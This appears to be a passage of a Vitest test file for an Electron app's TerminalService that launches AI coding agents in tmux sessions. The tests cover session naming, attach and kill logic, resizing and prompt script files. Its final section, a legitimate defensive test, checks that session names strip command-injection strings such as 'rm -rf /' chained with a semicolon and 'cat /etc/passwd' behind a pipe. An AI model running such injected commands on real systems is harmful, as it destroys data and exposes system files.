import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { TerminalService } from '../TerminalService'
import { BrowserWindow } from 'electron'
import * as pty from 'node-pty'
import * as fs from 'fs'
import { execSync, execFileSync } from 'child_process'

vi.mock('electron', () => ({
  BrowserWindow: vi.fn(),
  ipcMain: { on: vi.fn(), handle: vi.fn() }
}))

vi.mock('node-pty', () => ({
  spawn: vi.fn()
}))

vi.mock('fs', () => ({
  readFileSync: vi.fn(),
  existsSync: vi.fn(),
  statSync: vi.fn(),
  mkdirSync: vi.fn(),
  writeFileSync: vi.fn(),
  mkdtempSync: vi.fn().mockReturnValue('/tmp/minion-test123'),
  rmSync: vi.fn()
}))

vi.mock('child_process', () => ({
  execSync: vi.fn(),
  execFileSync: vi.fn()
}))

function createMockAgentService(): any {
  return {
    readAgentInfo: vi.fn().mockResolvedValue(null),
    updateAgentInfo: vi.fn().mockResolvedValue(undefined),
    getSuperMinionRulesPath: vi.fn().mockReturnValue('/path/to/rules'),
    getProjectName: vi.fn().mockImplementation((p: string) => p.split('/').pop() || 'project')
  }
}

function createMockSettingsService(terminalMode: 'tmux' | 'tabs' = 'tmux'): any {
  return {
    getSettings: vi.fn().mockReturnValue({
      terminal: { terminalMode }
    })
  }
}

function createMockPty(): any {
  return {
    write: vi.fn(),
    onData: vi.fn(),
    onExit: vi.fn(),
    resize: vi.fn(),
    kill: vi.fn(),
    pid: 12345
  }
}

function createMockMainWindow(): { mainWindow: any; webContents: any } {
  const webContents = { send: vi.fn() }
  const mainWindow = { webContents } as unknown as BrowserWindow
  return { mainWindow, webContents }
}

function setupDefaultMocks(mockPty: any): void {
  vi.mocked(pty.spawn).mockReturnValue(mockPty)
  vi.mocked(fs.existsSync).mockReturnValue(true)
  vi.mocked(fs.statSync).mockReturnValue({
    isDirectory: () => true,
    mode: 0o755,
    mtimeMs: Date.now()  // Add mtimeMs for file change detection
  } as any)
}

describe('TerminalService Tmux Integration', () => {
  let terminalService: TerminalService
  let mockMainWindow: any
  let mockPty: any
  let mockSettingsService: any

  beforeEach(() => {
    vi.clearAllMocks()
    const windowMocks = createMockMainWindow()
    mockMainWindow = windowMocks.mainWindow
    mockPty = createMockPty()
    mockSettingsService = createMockSettingsService('tmux')
    setupDefaultMocks(mockPty)
    terminalService = new TerminalService(mockMainWindow)
  })

  describe('isTmuxSessionAttached', () => {
    it('returns true when session exists and is attached', () => {
      // Mock tmux availability and list-sessions output
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd === 'which tmux') {
          return Buffer.from('/usr/bin/tmux')
        }
        if (cmd.includes('list-sessions')) {
          return 'minion-agent-1:1\nminion-agent-2:0\n'
        }
        return Buffer.from('')
      })

      const result = terminalService.isTmuxSessionAttached('minion-agent-1')

      expect(result).toBe(true)
    })

    it('returns false when session exists but not attached', () => {
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd === 'which tmux') {
          return Buffer.from('/usr/bin/tmux')
        }
        if (cmd.includes('list-sessions')) {
          return 'minion-agent-1:0\nminion-agent-2:1\n'
        }
        return Buffer.from('')
      })

      const result = terminalService.isTmuxSessionAttached('minion-agent-1')

      expect(result).toBe(false)
    })

    it('returns false when session does not exist', () => {
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd === 'which tmux') {
          return Buffer.from('/usr/bin/tmux')
        }
        if (cmd.includes('list-sessions')) {
          return 'minion-other-1:1\nminion-other-2:0\n'
        }
        return Buffer.from('')
      })

      const result = terminalService.isTmuxSessionAttached('minion-agent-1')

      expect(result).toBe(false)
    })

    it('returns false when tmux is unavailable', () => {
      vi.mocked(execSync).mockImplementation(() => {
        throw new Error('tmux not found')
      })

      const result = terminalService.isTmuxSessionAttached('minion-agent-1')

      expect(result).toBe(false)
    })

    it('returns false when list-sessions fails (no server running)', () => {
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd === 'which tmux') {
          return Buffer.from('/usr/bin/tmux')
        }
        if (cmd.includes('list-sessions')) {
          throw new Error('no server running on /tmp/tmux-501/default')
        }
        return Buffer.from('')
      })

      const result = terminalService.isTmuxSessionAttached('minion-agent-1')

      expect(result).toBe(false)
    })
  })

  describe('isTmuxAvailable', () => {
    it('returns true when tmux is installed', () => {
      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

      const result = terminalService.isTmuxAvailable()

      expect(result).toBe(true)
      expect(execSync).toHaveBeenCalledWith('which tmux', { encoding: 'utf8' })
    })

    it('returns false when tmux is not installed', () => {
      vi.mocked(execSync).mockImplementation(() => {
        throw new Error('tmux not found')
      })

      const result = terminalService.isTmuxAvailable()

      expect(result).toBe(false)
    })

    it('caches the result after first check', () => {
      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

      // First call
      terminalService.isTmuxAvailable()
      // Second call
      terminalService.isTmuxAvailable()

      // Should only call execSync once (result is cached)
      expect(execSync).toHaveBeenCalledTimes(1)
    })
  })

  describe('getTmuxSessionName', () => {
    it('generates sanitized session name from agentId', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-123')
      expect(sessionName).toBe('minion-agent-123')
    })

    it('sanitizes special characters in agentId', () => {
      const sessionName = terminalService.getTmuxSessionName('agent/with:special.chars')
      // Tmux session names cannot contain periods or colons
      expect(sessionName).toBe('minion-agent_with_special_chars')
    })

    it('handles empty agentId gracefully', () => {
      const sessionName = terminalService.getTmuxSessionName('')
      expect(sessionName).toBe('minion-')
    })
  })

  describe('killTmuxSession', () => {
    it('kills tmux session when it exists', () => {
      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))

      terminalService.killTmuxSession('agent-123')

      // SECURITY: Uses execFileSync with argument array to prevent command injection
      expect(execFileSync).toHaveBeenCalledWith(
        'tmux',
        ['kill-session', '-t', 'minion-agent-123'],
        expect.any(Object)
      )
    })

    it('does not throw when session does not exist', () => {
      // Mock kill-session throwing (session doesn't exist)
      vi.mocked(execFileSync).mockImplementation(() => {
        throw new Error('session not found')
      })

      // Should not throw - errors are silently ignored
      expect(() => terminalService.killTmuxSession('agent-123')).not.toThrow()
    })

    it('uses sanitized session name', () => {
      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))

      terminalService.killTmuxSession('agent/with:special.chars')

      // SECURITY: Uses execFileSync with argument array to prevent command injection
      expect(execFileSync).toHaveBeenCalledWith(
        'tmux',
        ['kill-session', '-t', 'minion-agent_with_special_chars'],
        expect.any(Object)
      )
    })
  })

  describe('startAgent with tmux mode', () => {
    beforeEach(() => {
      terminalService.setAgentService(createMockAgentService())
      terminalService.setSettingsService(mockSettingsService)
    })

    it('sends tmux new-session command when tmux mode is enabled and tmux is available', async () => {
      // tmux is available, but no existing session
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
        if (cmd.includes('has-session')) throw new Error('session not found')
        return Buffer.from('')
      })
      // Mock has-session check using execFileSync to indicate no session exists
      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
        if (cmd === 'tmux' && args?.includes('has-session')) {
          throw new Error('session not found')
        }
        return Buffer.from('')
      })

      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

      // First the shell is spawned
      expect(pty.spawn).toHaveBeenCalled()

      // Then tmux command is sent followed by the actual command
      const writeCalls = mockPty.write.mock.calls
      expect(writeCalls.length).toBeGreaterThanOrEqual(1)

      // The first write should be the tmux new-session command
      const firstWrite = writeCalls[0][0]
      expect(firstWrite).toContain('tmux new-session -A -s minion-agent-1')
    })

    it('falls back to normal mode when tmux is not available', async () => {
      // tmux is NOT available
      vi.mocked(execSync).mockImplementation(() => {
        throw new Error('tmux not found')
      })

      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

      // Shell is spawned
      expect(pty.spawn).toHaveBeenCalled()

      // Should NOT contain tmux command
      const writeCalls = mockPty.write.mock.calls
      const firstWrite = writeCalls[0][0]
      expect(firstWrite).not.toContain('tmux new-session')
      // Should just send the claude command directly
      expect(firstWrite).toContain('claude')
    })

    it('respects tabs mode setting (no tmux)', async () => {
      // tmux is available
      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

      // But settings say use tabs mode
      mockSettingsService.getSettings.mockReturnValue({
        terminal: {
          terminalMode: 'tabs'
        }
      })

      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

      // Should NOT contain tmux command
      const writeCalls = mockPty.write.mock.calls
      const firstWrite = writeCalls[0][0]
      expect(firstWrite).not.toContain('tmux new-session')
    })

    it('stores tmuxSession in terminal session info', async () => {
      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

      // Verify the session was stored with tmux info
      const hasTerminal = terminalService.hasActiveTerminal('agent-1')
      expect(hasTerminal).toBe(true)
    })

    it('attaches to tmux session when already attached elsewhere (multi-window support)', async () => {
      // Mock tmux available and session already attached
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
        if (cmd.includes('has-session')) return Buffer.from('') // Session exists
        if (cmd.includes('list-sessions')) return 'minion-agent-1:1\n'  // Session is attached
        return Buffer.from('')
      })
      // Mock has-session check using execFileSync to indicate session EXISTS
      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
        // Session exists - don't throw
        return Buffer.from('')
      })

      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

      // Should spawn PTY to run tmux attach
      expect(pty.spawn).toHaveBeenCalled()

      // Should run tmux attach-session (allows multiple clients on same session)
      const writeCalls = mockPty.write.mock.calls
      expect(writeCalls.length).toBeGreaterThanOrEqual(1)
      expect(writeCalls[0][0]).toContain('tmux attach-session -t minion-agent-1')
    })

    it('attaches to existing tmux session even if not attached elsewhere', async () => {
      // Mock tmux available and session exists but not attached
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
        if (cmd.includes('has-session')) return Buffer.from('') // Session exists
        if (cmd.includes('list-sessions')) return 'minion-agent-1:0\n'
        return Buffer.from('')
      })
      // Mock has-session check using execFileSync to indicate session EXISTS
      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
        // Session exists - don't throw
        return Buffer.from('')
      })

      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

      // Should spawn PTY and proceed
      expect(pty.spawn).toHaveBeenCalled()

      // Should attach to existing session (not create new)
      const writeCalls = mockPty.write.mock.calls
      expect(writeCalls.length).toBeGreaterThanOrEqual(1)
      expect(writeCalls[0][0]).toContain('tmux attach-session -t minion-agent-1')
    })

    it('writes command to temp script file for tmux mode', async () => {
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
        if (cmd.includes('has-session')) throw new Error('session not found')
        return Buffer.from('')
      })
      // Mock has-session check using execFileSync to indicate no session exists
      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
        if (cmd === 'tmux' && args?.includes('has-session')) {
          throw new Error('session not found')
        }
        return Buffer.from('')
      })

      // Prompt contains single quotes (common in super minion prompts like "Claude Code's Task tool")
      const promptWithQuotes = "Use Claude Code's Task tool"

      await terminalService.startAgent(
        '/path/to/project',
        'agent-1',
        'claude',
        'dev',
        promptWithQuotes
      )

      // Verify script file was written to temp directory with cmd prefix
      expect(fs.writeFileSync).toHaveBeenCalledWith(
        expect.stringMatching(/cmd-agent-1\.sh$/),
        expect.stringContaining('#!/bin/bash'),
        expect.any(Object)
      )

      // Verify terminal command runs the script from temp directory
      const writeCalls = mockPty.write.mock.calls
      const firstWrite = writeCalls[0][0]
      expect(firstWrite).toContain('cmd-agent-1.sh')
    })

    it('script file contains the full command with special characters', async () => {
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
        if (cmd.includes('has-session')) throw new Error('session not found')
        return Buffer.from('')
      })
      // Mock has-session check using execFileSync to indicate no session exists
      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
        if (cmd === 'tmux' && args?.includes('has-session')) {
          throw new Error('session not found')
        }
        return Buffer.from('')
      })

      // Prompt with newlines and quotes
      const complexPrompt = `You are a **Super Minion** using Claude Code's Task tool.

## Mission

1. **Step one**`

      await terminalService.startAgent(
        '/path/to/project',
        'agent-1',
        'claude',
        'dev',
        complexPrompt
      )

      // Get the content written to the script file (now in temp dir with cmd- prefix)
      const writeCall = vi.mocked(fs.writeFileSync).mock.calls.find(
        call => String(call[0]).includes('cmd-')
      )
      expect(writeCall).toBeDefined()
      const scriptContent = writeCall![1] as string

      // Script should contain the raw prompt with quotes and newlines preserved
      expect(scriptContent).toContain("Claude Code's Task tool")
      expect(scriptContent).toContain('## Mission')
    })

    it('handles complex super minion prompts via script file', async () => {
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
        if (cmd.includes('has-session')) throw new Error('session not found')
        return Buffer.from('')
      })
      // Mock has-session check using execFileSync to indicate no session exists
      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
        if (cmd === 'tmux' && args?.includes('has-session')) {
          throw new Error('session not found')
        }
        return Buffer.from('')
      })

      // Simulate a real super minion prompt with both issues
      const complexPrompt = `You are a **Super Minion** using Claude Code's Task tool.

## Mission

1. **Step one**
2. **Step two**`

      await terminalService.startAgent(
        '/path/to/project',
        'agent-1',
        'claude',
        'dev',
        complexPrompt
      )

      const writeCalls = mockPty.write.mock.calls
      const firstWrite = writeCalls[0][0]

      // Should contain the tmux command with session name and send-keys
      expect(firstWrite).toContain('tmux new-session -A -s minion-agent-1')
      expect(firstWrite).toContain('send-keys')

      // Should reference the script file, not inline command (cmd- prefix)
      expect(firstWrite).toContain('cmd-agent-1.sh')

      // Terminal write should be simple - no complex escaping needed
      const beforeCarriageReturn = firstWrite.split('\r')[0]
      expect(beforeCarriageReturn).not.toContain('\n')
    })
  })

  describe('stopAgent with tmux mode', () => {
    beforeEach(() => {
      vi.useFakeTimers()
      terminalService.setAgentService(createMockAgentService())
      terminalService.setSettingsService(mockSettingsService)
    })

    afterEach(() => {
      vi.useRealTimers()
    })

    it('kills tmux session when stopping agent in tmux mode', async () => {
      // tmux is available
      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

      // Clear previous calls
      vi.mocked(execSync).mockClear()
      vi.mocked(execFileSync).mockClear()
      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))

      // Stop the agent
      terminalService.stopAgent('agent-1')

      // Should have called kill-session using execFileSync for security
      expect(execFileSync).toHaveBeenCalledWith(
        'tmux',
        ['kill-session', '-t', 'minion-agent-1'],
        expect.any(Object)
      )
    })
  })

  describe('cleanup on app exit', () => {
    beforeEach(() => {
      terminalService.setAgentService(createMockAgentService())
      terminalService.setSettingsService(mockSettingsService)
    })

    it('does NOT kill tmux sessions on cleanup (preserves for other windows)', async () => {
      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

      // Start multiple agents
      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
      await terminalService.startAgent('/path/to/project', 'agent-2', 'claude', 'dev')

      // Clear previous calls
      vi.mocked(execSync).mockClear()
      vi.mocked(execFileSync).mockClear()

      // Cleanup all
      terminalService.cleanup()

      // Should NOT have killed tmux sessions (preserves for other windows)
      // Check execFileSync since that's what's used for kill-session
      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
      )
      expect(killCalls.length).toBe(0)
    })

    it('stopAgent still kills the tmux session (explicit user action)', async () => {
      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

      // Clear previous calls
      vi.mocked(execSync).mockClear()
      vi.mocked(execFileSync).mockClear()
      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))

      // Explicitly stop the agent
      terminalService.stopAgent('agent-1')

      // Should have killed the tmux session using execFileSync
      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
      )
      expect(killCalls.length).toBe(1)
      expect(killCalls[0][1]).toContain('minion-agent-1')
    })
  })

  describe('killOrphanedTmuxSessions', () => {
    it('only kills sessions without active agents', () => {
      // Mock tmux available and list-sessions
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd === 'which tmux') {
          return Buffer.from('/usr/bin/tmux')
        }
        // list-sessions for session names
        if (cmd.includes('list-sessions') && !cmd.includes('#{session_attached}')) {
          return 'minion-agent-1\nminion-agent-2\nminion-orphan-1\n'
        }
        // list-sessions for attached check - none attached
        if (cmd.includes('list-sessions') && cmd.includes('#{session_attached}')) {
          return 'minion-agent-1:0\nminion-agent-2:0\nminion-orphan-1:0\n'
        }
        return Buffer.from('')
      })
      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))

      // agent-1 and agent-2 are active, orphan-1 is not
      const killed = terminalService.killOrphanedTmuxSessions(['agent-1', 'agent-2'])

      // Should only kill orphan-1
      expect(killed).toBe(1)

      // Verify kill-session was only called for orphan-1 using execFileSync
      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
      )
      expect(killCalls.length).toBe(1)
      expect(killCalls[0][1]).toContain('minion-orphan-1')
    })

    it('preserves attached sessions even without active agent', () => {
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd === 'which tmux') {
          return Buffer.from('/usr/bin/tmux')
        }
        if (cmd.includes('list-sessions') && !cmd.includes('#{session_attached}')) {
          return 'minion-orphan-1\nminion-orphan-2\n'
        }
        if (cmd.includes('list-sessions') && cmd.includes('#{session_attached}')) {
          return 'minion-orphan-1:1\nminion-orphan-2:0\n'  // orphan-1 attached, orphan-2 not
        }
        return Buffer.from('')
      })
      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))

      // No active agents, but orphan-1 is attached (another window)
      const killed = terminalService.killOrphanedTmuxSessions([])

      // Should only kill orphan-2 (orphan-1 is attached)
      expect(killed).toBe(1)

      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
      )
      expect(killCalls.length).toBe(1)
      expect(killCalls[0][1]).toContain('minion-orphan-2')
    })

    it('kills no sessions when all have active agents', () => {
      vi.mocked(execSync).mockImplementation((cmd: string) => {
        if (cmd === 'which tmux') {
          return Buffer.from('/usr/bin/tmux')
        }
        if (cmd.includes('list-sessions') && !cmd.includes('#{session_attached}')) {
          return 'minion-active-1\nminion-active-2\n'
        }
        if (cmd.includes('list-sessions') && cmd.includes('#{session_attached}')) {
          return 'minion-active-1:0\nminion-active-2:0\n'  // Not attached but have active agents
        }
        return Buffer.from('')
      })

      const killed = terminalService.killOrphanedTmuxSessions(['active-1', 'active-2'])

      expect(killed).toBe(0)

      // Verify no kill-session calls were made with execFileSync
      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
      )
      expect(killCalls.length).toBe(0)
    })
  })
})

describe('TerminalService Settings Integration', () => {
  let terminalService: TerminalService
  let mockMainWindow: any
  let mockPty: any

  beforeEach(() => {
    vi.clearAllMocks()
    const windowMocks = createMockMainWindow()
    mockMainWindow = windowMocks.mainWindow
    mockPty = createMockPty()
    setupDefaultMocks(mockPty)
    terminalService = new TerminalService(mockMainWindow)
  })

  it('defaults to tabs mode when no settings service is set', async () => {
    vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
    terminalService.setAgentService(createMockAgentService())
    // NOT setting settings service

    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

    // Should NOT use tmux (default to tabs)
    const firstWrite = mockPty.write.mock.calls[0][0]
    expect(firstWrite).not.toContain('tmux new-session')
  })

  it('uses tmux when setting is explicitly set to tmux', async () => {
    vi.mocked(execSync).mockImplementation((cmd: string) => {
      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
      if (cmd.includes('has-session')) throw new Error('session not found')
      return Buffer.from('')
    })
    // Mock has-session check using execFileSync to indicate no session exists
    vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
      if (cmd === 'tmux' && args?.includes('has-session')) {
        throw new Error('session not found')
      }
      return Buffer.from('')
    })
    terminalService.setAgentService(createMockAgentService())
    terminalService.setSettingsService(createMockSettingsService('tmux'))

    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

    // Should use tmux (create new session since none exists)
    const firstWrite = mockPty.write.mock.calls[0][0]
    expect(firstWrite).toContain('tmux new-session -A -s minion-agent-1')
  })
})

describe('Plain Terminal with Tmux Mode', () => {
  let terminalService: TerminalService
  let mockMainWindow: any
  let mockPty: any

  beforeEach(() => {
    vi.clearAllMocks()
    const windowMocks = createMockMainWindow()
    mockMainWindow = windowMocks.mainWindow
    mockPty = createMockPty()
    setupDefaultMocks(mockPty)
    terminalService = new TerminalService(mockMainWindow)
    terminalService.setSettingsService(createMockSettingsService('tmux'))
  })

  it('plain terminals spawn independently without tmux wrapper', async () => {
    vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
    terminalService.setAgentService(createMockAgentService())

    // Start a plain terminal
    await terminalService.startPlainTerminal('/path/to/project', 'agent-1', 'terminal-1')

    // Plain terminal spawns a shell directly, without tmux
    expect(pty.spawn).toHaveBeenCalled()
    // Plain terminals don't write any commands to PTY (they just open a shell)
    expect(mockPty.write).not.toHaveBeenCalled()
  })
})

describe('TerminalService resize with tmux', () => {
  let terminalService: TerminalService
  let mockMainWindow: any
  let mockPty: any
  let mockSettingsService: any

  beforeEach(() => {
    vi.clearAllMocks()
    const windowMocks = createMockMainWindow()
    mockMainWindow = windowMocks.mainWindow
    mockPty = createMockPty()
    mockSettingsService = createMockSettingsService('tmux')
    setupDefaultMocks(mockPty)
    terminalService = new TerminalService(mockMainWindow)
    terminalService.setAgentService(createMockAgentService())
    terminalService.setSettingsService(mockSettingsService)
  })

  it('notifies tmux via resize-window when resizing session with tmuxSession', async () => {
    // tmux is available
    vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

    // Start agent in tmux mode
    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

    // Clear previous calls from startAgent/isTmuxAvailable
    vi.mocked(execSync).mockClear()
    vi.mocked(execFileSync).mockClear()
    vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))

    // Resize the terminal
    terminalService.resize('agent-1', 120, 40)

    // Should have called pty.resize
    expect(mockPty.resize).toHaveBeenCalledWith(120, 40)

    // Should have called tmux resize-window for both windows using execFileSync (rows - 1 for status bar)
    expect(execFileSync).toHaveBeenCalledWith(
      'tmux',
      ['resize-window', '-t', 'minion-agent-1:0', '-x', '120', '-y', '39'],
      expect.any(Object)
    )
    expect(execFileSync).toHaveBeenCalledWith(
      'tmux',
      ['resize-window', '-t', 'minion-agent-1:1', '-x', '120', '-y', '39'],
      expect.any(Object)
    )
  })

  it('does NOT call tmux resize-window when resizing session without tmuxSession (tabs mode)', async () => {
    // tmux is available but we use tabs mode
    vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

    // Change settings to tabs mode
    mockSettingsService.getSettings.mockReturnValue({
      terminal: { terminalMode: 'tabs' }
    })

    // Start agent in tabs mode
    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

    // Clear previous calls from startAgent/isTmuxAvailable
    vi.mocked(execSync).mockClear()
    vi.mocked(execFileSync).mockClear()

    // Resize the terminal
    terminalService.resize('agent-1', 120, 40)

    // Should have called pty.resize
    expect(mockPty.resize).toHaveBeenCalledWith(120, 40)

    // Should NOT have called tmux resize-window (no tmux session)
    // Check that no execFileSync calls were made with resize-window
    const resizeCalls = vi.mocked(execFileSync).mock.calls.filter(
      call => call[1] && Array.isArray(call[1]) && call[1].includes('resize-window')
    )
    expect(resizeCalls.length).toBe(0)
  })

  it('silently handles tmux resize-window failure', async () => {
    // tmux is available
    vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))

    // Start agent in tmux mode
    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

    // Make resize-window fail (e.g., session doesn't exist yet)
    vi.mocked(execSync).mockClear()
    vi.mocked(execFileSync).mockClear()
    vi.mocked(execFileSync).mockImplementation(() => {
      throw new Error('no server running')
    })

    // Resize should not throw
    expect(() => terminalService.resize('agent-1', 120, 40)).not.toThrow()

    // Should still have called pty.resize
    expect(mockPty.resize).toHaveBeenCalledWith(120, 40)
  })
})

describe('TerminalService tmux two windows', () => {
  let terminalService: TerminalService
  let mockMainWindow: any
  let mockPty: any
  let mockSettingsService: any

  beforeEach(() => {
    vi.clearAllMocks()
    const windowMocks = createMockMainWindow()
    mockMainWindow = windowMocks.mainWindow
    mockPty = createMockPty()
    mockSettingsService = createMockSettingsService('tmux')
    setupDefaultMocks(mockPty)
    terminalService = new TerminalService(mockMainWindow)
    terminalService.setAgentService(createMockAgentService())
    terminalService.setSettingsService(mockSettingsService)
  })

  it('creates two tmux windows: agent (window 0) and shell (window 1, detached)', async () => {
    // tmux is available, but session doesn't exist yet
    vi.mocked(execSync).mockImplementation((cmd: string) => {
      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
      if (cmd.includes('has-session')) throw new Error('session not found')
      return Buffer.from('')
    })
    // Mock has-session check using execFileSync to indicate no session exists
    vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
      if (cmd === 'tmux' && args?.includes('has-session')) {
        throw new Error('session not found')
      }
      return Buffer.from('')
    })

    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

    // Get the tmux command that was written
    const writeCalls = mockPty.write.mock.calls
    expect(writeCalls.length).toBeGreaterThanOrEqual(1)
    const tmuxCommand = writeCalls[0][0]

    // Should create a new window named "shell" with -d flag (detached, doesn't switch focus)
    expect(tmuxCommand).toContain('new-window -d -n shell')

    // Should NOT have select-window (using -d flag instead)
    expect(tmuxCommand).not.toContain('select-window')
  })

  it('creates shell window after agent window in tmux command order', async () => {
    // tmux is available, but session doesn't exist yet
    vi.mocked(execSync).mockImplementation((cmd: string) => {
      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
      if (cmd.includes('has-session')) throw new Error('session not found')
      return Buffer.from('')
    })
    // Mock has-session check using execFileSync to indicate no session exists
    vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
      if (cmd === 'tmux' && args?.includes('has-session')) {
        throw new Error('session not found')
      }
      return Buffer.from('')
    })

    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

    const tmuxCommand = mockPty.write.mock.calls[0][0]

    // The order should be: new-session -> send-keys (agent command) -> new-window -d
    const newSessionIndex = tmuxCommand.indexOf('new-session')
    const sendKeysIndex = tmuxCommand.indexOf('send-keys')
    const newWindowIndex = tmuxCommand.indexOf('new-window -d -n shell')

    expect(newSessionIndex).toBeLessThan(sendKeysIndex)
    expect(sendKeysIndex).toBeLessThan(newWindowIndex)
  })

  it('attaches to existing tmux session instead of creating new one', async () => {
    // tmux is available AND session already exists
    vi.mocked(execSync).mockImplementation((cmd: string) => {
      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
      if (cmd.includes('has-session')) return Buffer.from('') // Session exists (no error)
      return Buffer.from('')
    })
    // Mock has-session check using execFileSync to indicate session EXISTS
    vi.mocked(execFileSync).mockImplementation((cmd: string, args?: string[]) => {
      // Session exists - don't throw
      return Buffer.from('')
    })

    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')

    const writeCalls = mockPty.write.mock.calls
    expect(writeCalls.length).toBeGreaterThanOrEqual(1)
    const tmuxCommand = writeCalls[0][0]

    // Should attach to existing session, not create new one
    expect(tmuxCommand).toContain('tmux attach-session -t minion-agent-1')
    expect(tmuxCommand).not.toContain('new-session')
    expect(tmuxCommand).not.toContain('send-keys')
  })
})

describe('TerminalService Security - Command Injection Prevention', () => {
  let terminalService: TerminalService
  let mockMainWindow: any
  let mockPty: any

  beforeEach(() => {
    vi.clearAllMocks()
    const windowMocks = createMockMainWindow()
    mockMainWindow = windowMocks.mainWindow
    mockPty = createMockPty()
    setupDefaultMocks(mockPty)
    terminalService = new TerminalService(mockMainWindow)
  })

  describe('getTmuxSessionName - shell injection prevention', () => {
    it('sanitizes semicolons that could chain commands', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-1; rm -rf /')
      expect(sessionName).not.toContain(';')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('sanitizes pipe characters that could pipe to other commands', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-1 | cat /etc/passwd')
      expect(sessionName).not.toContain('|')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('sanitizes ampersand for background command execution', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-1 && malicious')
      expect(sessionName).not.toContain('&')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('sanitizes backticks for command substitution', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-`whoami`')
      expect(sessionName).not.toContain('`')
